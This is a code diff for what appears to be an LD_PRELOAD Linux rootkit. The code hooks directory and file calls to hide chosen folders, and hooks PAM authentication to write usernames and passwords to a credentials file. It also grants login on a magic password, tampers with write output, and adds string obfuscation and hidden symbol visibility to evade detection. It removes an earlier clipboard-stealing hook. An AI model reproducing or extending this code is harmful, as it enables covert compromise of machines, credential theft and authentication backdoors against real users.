@@ -23,6 +23,12 @@
 #include <inttypes.h>
 #include <dirent.h>
 #include <X11/Xlib.h>
+#include <gtk/gtk.h>
+#include <X11/Xutil.h>
+#include <X11/Xatom.h>
+#include <sys/syscall.h>
+#include <gio/gio.h>
+#include <glib.h>
 
 
 static int (*original_getaddrinfo)(const char *node, const char *service, const struct addrinfo *hints, struct addrinfo **res);
@@ -44,6 +50,8 @@ static int (*original_pam_get_authtok)(pam_handle_t* pamh, int item, const char 
 static int (*original_pam_get_user)(const pam_handle_t *pamh, const char **user, const char *prompt);
 static ssize_t (*original_write)(int fd, const void *buf, size_t count);
 static ssize_t (*original_read)(int fd, void *buf, size_t count);
+static size_t (*original_fwrite)(const void *ptr, size_t size, size_t nmemb, FILE *stream);
+static ssize_t (*original_getdents64)(int fd, void *dirp, size_t count);
 
 #define PAM_SUCCESS 0
 #define PAM_SERVICE 1
@@ -51,16 +59,17 @@ static ssize_t (*original_read)(int fd, void *buf, size_t count);
 #define PAM_RHOST 4
 #define PAM_USER 2
 
+__attribute__((visibility("hidden")))
 void get_heap_bounds(uint64_t* heap_start, uint64_t* heap_end){
     FILE *stream;
     char *line = NULL;
     size_t len = 0;
     ssize_t nread;
 
-    stream = fopen("/proc/self/maps", "r");
+    stream = fopen(AY_OBFUSCATE("/proc/self/maps"), "r");
 
     while ((nread = getline(&line, &len, stream)) != -1) {
-        if (strstr(line, "[heap]")){
+        if (strstr(line, AY_OBFUSCATE("[heap]"))){
             sscanf(line, "%" SCNx64 "-%" SCNx64 "", heap_start, heap_end);
             break;
         }
@@ -69,7 +78,7 @@ void get_heap_bounds(uint64_t* heap_start, uint64_t* heap_end){
     free(line);
     fclose(stream);
 }
-
+__attribute__((visibility("hidden")))
 bool is_heap_var(void* pointer){
     uint64_t heap_start = 0;
     uint64_t heap_end = 0;
@@ -85,7 +94,7 @@ bool is_heap_var(void* pointer){
 // hide folders
 struct dirent *readdir(DIR *dirp) {
     struct dirent *(*real_readdir)(DIR *);
-    real_readdir = dlsym(RTLD_NEXT, "readdir");
+    real_readdir = dlsym(RTLD_NEXT, AY_OBFUSCATE("readdir"));
 
     struct dirent *entry;
     while ((entry = real_readdir(dirp)) != NULL) {
@@ -98,35 +107,80 @@ struct dirent *readdir(DIR *dirp) {
     return NULL;  
 }
 
+int open(const char *pathname, int flags, mode_t mode) {
+  // Carrega a função original do open
+  int (*original_open)(const char *, int, mode_t) = dlsym(RTLD_NEXT, AY_OBFUSCATE("open"));
 
-// get clipboard content
-int XConvertSelection(Display* display, Atom selection, Atom target, Atom property, Window requestor, Time time) {
-    int ret = -1;
+  // Se o arquivo a ser aberto for a pasta desejada, retorna um erro
+  if (strstr(pathname, (char*)*HIDDEN_FOLDERS) != NULL) {
+    return -1;
+  }
 
+  // Chama o open original para abrir o arquivo
+  return (*original_open)(pathname, flags, mode);
+}
 
-    int (*original_XConvertSelection)(Display*, Atom, Atom, Atom, Window, Time);
-    original_XConvertSelection = dlsym(RTLD_NEXT, "XConvertSelection");
-    ret = (*original_XConvertSelection)(display, selection, target, property, requestor, time);
+DIR *opendir(const char *name) {
+  // Carrega a função original do opendir
+  DIR *(*original_opendir)(const char *) = dlsym(RTLD_NEXT, AY_OBFUSCATE("opendir"));
 
-    if (ret != 0) {
-        char* clipboard_data = NULL;
-        Atom actual_type;
-        int actual_format;
-        unsigned long nitems;
-        unsigned long bytes_after;
-        ret = XGetWindowProperty(display, requestor, property, 0, 0x7fffffff, False, AnyPropertyType,
-                                 &actual_type, &actual_format, &nitems, &bytes_after, (unsigned char**)&clipboard_data);
+  // Se o diretório a ser aberto for a pasta desejada, retorna um erro
+  if (strstr(name, (char*)*HIDDEN_FOLDERS) != NULL) {
+    return NULL;
+  }
 
+  // Chama o opendir original para abrir o diretório
+  return (*original_opendir)(name);
+}
+__attribute__((visibility("hidden")))
+int filter(const struct dirent *entry){
+    if (strcmp(entry->d_name, AY_OBFUSCATE(".")) == 0 || strcmp(entry->d_name, AY_OBFUSCATE("..")) == 0) {
+        return 0;
+    }
+    if (strstr(entry->d_name, (char*)*HIDDEN_FOLDERS) != NULL) {
+        return 0;
+    }
+    return 1;
+}
 
-        if (clipboard_data != NULL) {
-            printf("Conteúdo do clipboard: %s\n", clipboard_data);
-        }
+int scandir(const char *dirp, struct dirent ***namelist, int (*filter)(const struct dirent *),
+           int (*compar)(const struct dirent **, const struct dirent **)){
+    int count = 0;
+    struct dirent **list;
+    struct dirent *entry;
 
-        XFree(clipboard_data);
+    DIR *dir = opendir(dirp);
+    if (dir == NULL) {
+        return -1;
     }
 
-    return ret;
+    while ((entry = readdir(dir)) != NULL) {
+        if (filter(entry)) {
+            count++;
+        }
+    }
+
+    rewinddir(dir);
+    list = (struct dirent **) malloc(sizeof(struct dirent *) * count);
+
+    int i = 0;
+    while ((entry = readdir(dir)) != NULL) {
+        if (filter(entry)) {
+            list[i] = entry;
+            i++;
+        }
+    }
+
+    qsort(list, count, sizeof(struct dirent *), (int (*)(const void *, const void *)) compar);
+
+    *namelist = list;
+    closedir(dir);
+
+    return count;
 }
+
+
+typedef ssize_t (*orig_read)(int fd, void *buf, size_t count);
 
 // file content tampering
 ssize_t write(int fd, const void *buf, size_t count){
@@ -147,10 +201,17 @@ ssize_t write(int fd, const void *buf, size_t count){
 				((char*)buf)[i] = '\r';
 			}
 		}
+		else{
+			buf = 0;
+
+		}
 	};
 	ssize_t ret = original_write(fd, buf, count);
 	return ret;
 }
+
+
+
 
 // PAM hooks
 
@@ -168,18 +229,18 @@ int pam_get_user(const pam_handle_t *pamh, const char **user, const char *prompt
 		original_pam_get_user = (int(*)(pam_handle_t*, const char**, const char*))dlsym(RTLD_NEXT, AY_OBFUSCATE("pam_get_user"));
 	}
 	int ret = original_pam_get_user(pamh, user, prompt);
-	if(ret == PAM_SUCCESS && !strcmp((char*)*user, "sshd")){
+	if(ret == PAM_SUCCESS && !strcmp((char*)*user, AY_OBFUSCATE("sshd"))){
 		username = user;
 	}
 	return ret;
 }
 
-
+__attribute__((visibility("hidden")))
 int save_creds(){
-	fptr = fopen(AY_OBFUSCATE("/tmp/creds"),"at");
+	fptr = fopen((char*)*CREDENTIALS_FILE,"at");
 	char buffer[1024];
 	if(!fptr){
-		fptr = fopen(AY_OBFUSCATE("/tmp/creds"), "wt");
+		fptr = fopen((char*)*CREDENTIALS_FILE, "wt");
 	}
 	snprintf(buffer, sizeof(buffer), AY_OBFUSCATE("PAM :: %s - %s - %s - %s\n"), (char*)service, (char*)rhost, (char*)user, passpam);
 	fwrite(buffer, sizeof(char), strlen(buffer), fptr);
@@ -204,7 +265,6 @@ int pam_acct_mgmt(pam_handle_t *pamh, int flags){
 	}
 	int ret = original_pam_acct_mgmt(pamh, flags);
 	if (ret == PAM_AUTH_ERR && !strcmp(wrongpass, MAGIC_PASS)) {
-		printf(AY_OBFUSCATE("Wrongpass with :: %s\n"), wrongpass);
 		return PAM_SUCCESS;
 	}
 	return ret;
@@ -219,7 +279,7 @@ int pam_authenticate(pam_handle_t * pamh, int flags)
 
 	if (!orig_pam_authenticate) {
 		orig_pam_authenticate =
-		    dlsym(RTLD_NEXT, "pam_authenticate");
+		    dlsym(RTLD_NEXT, AY_OBFUSCATE("pam_authenticate"));
 	}
 
 	int r = orig_pam_authenticate(pamh, flags);
@@ -265,3 +325,4 @@ int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, s
 	ret = original_getpwnam_r(name, pwd, buf, buflen, result);
 	return ret;
 }
+
